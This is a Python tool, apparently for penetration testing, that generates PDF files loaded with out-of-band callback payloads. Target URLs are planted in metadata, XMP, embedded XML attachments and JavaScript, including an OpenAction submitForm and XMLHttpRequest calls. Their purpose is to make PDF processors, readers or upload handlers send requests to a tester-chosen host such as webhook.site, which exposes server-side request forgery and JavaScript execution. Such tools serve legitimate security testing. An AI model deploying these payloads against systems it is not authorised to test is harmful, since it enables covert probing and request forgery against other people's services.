#!/usr/bin/env python3

import sys
import os
import random
import string
import base64
import hashlib
import argparse
import logging
from urllib.parse import urlparse
from PyPDF2 import PdfWriter


def setup_logging(random_id):
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(f"{log_dir}/{random_id}.txt"),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)


def generate_random_string(length=8, prefix=""):
    return prefix + ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def sanitize_url(url):
    if not url:
        raise ValueError("URL cannot be empty")
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        parsed = urlparse(url)
        if not parsed.netloc:
            raise ValueError("Invalid URL: no network location")
        
        if '.' not in parsed.netloc:
            raise ValueError("Invalid domain format")
        
        return parsed.geturl(), parsed.scheme, parsed.netloc
        
    except Exception as e:
        raise ValueError(f"URL parsing failed: {str(e)}")


def calculate_file_hash(filename):
    try:
        with open(filename, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception as e:
        logging.error(f"Hash calculation failed: {e}")
        return None


def create_minimal_pdf(writer, target_url, domain, random_id, scheme):
    logging.info("Adding minimal ping payloads...")
    
    simple_payload = f"""<test>
<ping>{scheme}://min.{random_id}.{domain}/</ping>
<scan>{target_url}/min_{random_id}</scan>
</test>"""
    
    metadata = {
        '/Title': f'Doc-{random_id}',
        '/Author': 'PDF Generator',
        '/Subject': simple_payload,
        '/Creator': 'Security Test Tool',
    }
    
    success_count = 0
    for key, value in metadata.items():
        try:
            writer.add_metadata({key: value})
            success_count += 1
        except Exception as e:
            logging.warning(f"Failed to add {key}: {e}")
    
    logging.info(f"Minimal metadata: {success_count}/{len(metadata)} added")
    return success_count > 0


def create_xmp_pdf(writer, target_url, domain, random_id, scheme):
    logging.info("Adding XMP metadata payloads...")
    
    xmp_payload = f"""<?xpacket begin="?" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
 <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
  <rdf:Description rdf:about="">
   <ping>{scheme}://xmp.{random_id}.{domain}/</ping>
   <scan>{target_url}/xmp_{random_id}</scan>
  </rdf:Description>
 </rdf:RDF>
</x:xmpmeta>"""
    
    try:
        writer.add_metadata({'/XXMP': xmp_payload})
        logging.info("XMP metadata added successfully")
        return True
    except Exception as e:
        logging.warning(f"XMP metadata failed: {e}")
        return False


def create_javascript_pdf(writer, target_url, domain, random_id, scheme, disable_js=False):
    if disable_js:
        logging.info("JavaScript disabled via flag")
        return True
        
    logging.info("Adding JavaScript payloads...")
    
    js_payload = f"""
console.println("PDF JS Test");
try {{
    var img = new Image();
    img.src = "{scheme}://js.{random_id}.{domain}/?id=" + Math.random();
}} catch(e) {{}}

try {{
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "{target_url}/js_{random_id}", true);
    xhr.send();
}} catch(e) {{}}
"""
    
    js_success = False
    openaction_success = False
    
    try:
        writer.add_js(js_payload)
        js_success = True
        logging.info("JS added via add_js()")
    except Exception as e:
        logging.warning(f"add_js() failed: {e}")
    
    openaction_js = f"""
app.alert("Document Loading...");
this.submitForm("{scheme}://oa.{random_id}.{domain}/");
"""
    
    try:
        writer.add_metadata({
            '/OpenAction': f'<</S/JavaScript/JS({openaction_js})>>'
        })
        openaction_success = True
        logging.info("JS added via OpenAction")
    except Exception as e:
        logging.warning(f"OpenAction JS failed: {e}")
    
    return js_success or openaction_success


def create_embedded_pdf(writer, target_url, domain, random_id, scheme, no_attachments=False):
    if no_attachments:
        logging.info("Attachments disabled via flag")
        return True
        
    logging.info("Adding embedded files...")
    
    embedded_xml = f"""<?xml version="1.0"?>
<embedded>
    <ping>{scheme}://emb.{random_id}.{domain}/</ping>
    <scan>{target_url}/emb_{random_id}</scan>
</embedded>"""
    
    try:
        writer.add_attachment(f"config_{random_id}.xml", embedded_xml.encode())
        logging.info("Embedded file added successfully")
        return True
    except Exception as e:
        logging.warning(f"Embedded file failed: {e}")
        return False


def create_full_pdf(writer, target_url, domain, random_id, scheme, args):
    logging.info("Adding all techniques...")
    
    results = {
        'minimal': create_minimal_pdf(writer, target_url, domain, random_id, scheme),
        'xmp': create_xmp_pdf(writer, target_url, domain, random_id, scheme),
        'javascript': create_javascript_pdf(writer, target_url, domain, random_id, scheme, args.disable_js),
        'embedded': create_embedded_pdf(writer, target_url, domain, random_id, scheme, args.no_attachments)
    }
    
    advanced_metadata = {
        '/Keywords': f'{scheme}://adv.{random_id}.{domain}/',
        '/Producer': f'PDF-{random_id}',
        '/CustomField': f'{target_url}/custom_{random_id}'
    }
    
    advanced_success = 0
    for key, value in advanced_metadata.items():
        try:
            writer.add_metadata({key: value})
            advanced_success += 1
        except Exception as e:
            logging.warning(f"Failed to add {key}: {e}")
    
    results['advanced'] = advanced_success > 0
    
    successful_techniques = [k for k, v in results.items() if v]
    logging.info(f"Full mode results: {len(successful_techniques)}/{len(results)} techniques successful")
    
    return len(successful_techniques) > 0


def create_pdf(pdf_name, target_url, mode, args):
    if not pdf_name.endswith('.pdf'):
        pdf_name += '.pdf'
    
    random_id = generate_random_string(length=args.id_length, prefix=args.id_prefix)
    
    logger = setup_logging(random_id)
    
    logger.info(f"Creating PDF: {pdf_name}")
    logger.info(f"Mode: {mode}")
    logger.info(f"Target: {target_url}")
    logger.info(f"Random ID: {random_id}")
    logger.info(f"ID Length: {args.id_length}, Prefix: '{args.id_prefix}'")
    logger.info(f"Flags - Disable JS: {args.disable_js}, No Attachments: {args.no_attachments}")
    
    try:
        clean_url, scheme, domain = sanitize_url(target_url)
        logger.info(f"Parsed - Scheme: {scheme}, Domain: {domain}")
    except ValueError as e:
        logger.error(f"URL validation failed: {e}")
        return None, None
    
    writer = PdfWriter()
    
    success = False
    if mode == 'minimal':
        success = create_minimal_pdf(writer, clean_url, domain, random_id, scheme)
    elif mode == 'xmp-only':
        success = create_xmp_pdf(writer, clean_url, domain, random_id, scheme)
    elif mode == 'js-only':
        success = create_javascript_pdf(writer, clean_url, domain, random_id, scheme, args.disable_js)
    elif mode == 'full':
        success = create_full_pdf(writer, clean_url, domain, random_id, scheme, args)
    else:
        success = create_minimal_pdf(writer, clean_url, domain, random_id, scheme)
    
    if not success:
        logger.error("No PDF techniques were successful")
        return None, None
    
    writer.add_blank_page(width=595, height=842)
    
    try:
        with open(pdf_name, 'wb') as f:
            writer.write(f)
        
        file_size = os.path.getsize(pdf_name)
        file_hash = calculate_file_hash(pdf_name)
        
        logger.info("PDF created successfully!")
        logger.info(f"File: {pdf_name}")
        logger.info(f"Size: {file_size} bytes")
        logger.info(f"SHA256: {file_hash}")
        
        return pdf_name, random_id
        
    except Exception as e:
        logger.error(f"Error saving PDF: {e}")
        return None, None


def show_ping_targets(target_url, domain, random_id, mode, scheme, args):
    logging.info("\n" + "="*60)
    logging.info("🎯 EXPECTED REQUESTS - Mode: %s", mode.upper())
    logging.info("="*60)
    
    requests = []
    
    if mode in ['minimal', 'full']:
        requests.append(f"{scheme}://min.{random_id}.{domain}/")
        requests.append(f"{target_url}/min_{random_id}")
    
    if mode in ['xmp-only', 'full']:
        requests.append(f"{scheme}://xmp.{random_id}.{domain}/")
        requests.append(f"{target_url}/xmp_{random_id}")
    
    if mode in ['js-only', 'full'] and not args.disable_js:
        requests.append(f"{scheme}://js.{random_id}.{domain}/")
        requests.append(f"{scheme}://oa.{random_id}.{domain}/")
        requests.append(f"{target_url}/js_{random_id}")
    
    if mode in ['full'] and not args.no_attachments:
        requests.append(f"{scheme}://emb.{random_id}.{domain}/")
        requests.append(f"{target_url}/emb_{random_id}")
        requests.append(f"{scheme}://adv.{random_id}.{domain}/")
        requests.append(f"{target_url}/custom_{random_id}")
    
    for req in requests:
        logging.info("  • %s", req)


def main():
    parser = argparse.ArgumentParser(
        description='PDF Ping Generator - Professional Edition - Create PDF files with ping payloads for security testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s test.pdf webhook.site --mode minimal
  %(prog)s scan.pdf https://webhook.site/abc --mode full --id-length 12
  %(prog)s test.pdf example.com --mode js-only --disable-js --id-prefix corp
  %(prog)s doc.pdf target.com --mode full --no-attachments
        '''
    )
    
    parser.add_argument('pdf_name', help='Output PDF file name')
    parser.add_argument('target_url', help='Target URL for ping requests')
    parser.add_argument('--mode', choices=['minimal', 'xmp-only', 'js-only', 'full'], 
                       default='minimal', help='PDF generation mode (default: minimal)')
    parser.add_argument('--id-length', type=int, default=8, 
                       help='Random ID length (default: 8)')
    parser.add_argument('--id-prefix', default='', 
                       help='Prefix for random ID (default: none)')
    parser.add_argument('--disable-js', action='store_true',
                       help='Disable JavaScript payloads')
    parser.add_argument('--no-attachments', action='store_true',
                       help='Disable embedded attachments')
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()
    
    print("PDF Ping Generator - Professional Edition")
    print("=" * 55)
    
    try:
        created_file, random_id = create_pdf(args.pdf_name, args.target_url, args.mode, args)
        
        if created_file and random_id:
            clean_url, scheme, domain = sanitize_url(args.target_url)
            
            show_ping_targets(clean_url, domain, random_id, args.mode, scheme, args)
            
            logging.info("\n+ READY FOR TESTING!")
            logging.info("File: %s", created_file)
            logging.info("\n+ Upload this PDF to test outbound requests!")
            logging.info("+ Check logs/%s.txt for detailed payload information", random_id)
            
            sys.exit(0)
            
        else:
            logging.error("xxx PDF creation failed!")
            sys.exit(1)
            
    except ValueError as e:
        logging.error("xxx URL Error: %s", e)
        sys.exit(1)
    except KeyboardInterrupt:
        logging.info("!!  Operation cancelled by user")
        sys.exit(1)
    except Exception as e:
        logging.error("xxx Unexpected error: %s", str(e))
        sys.exit(1)


if __name__ == "__main__":
    main()
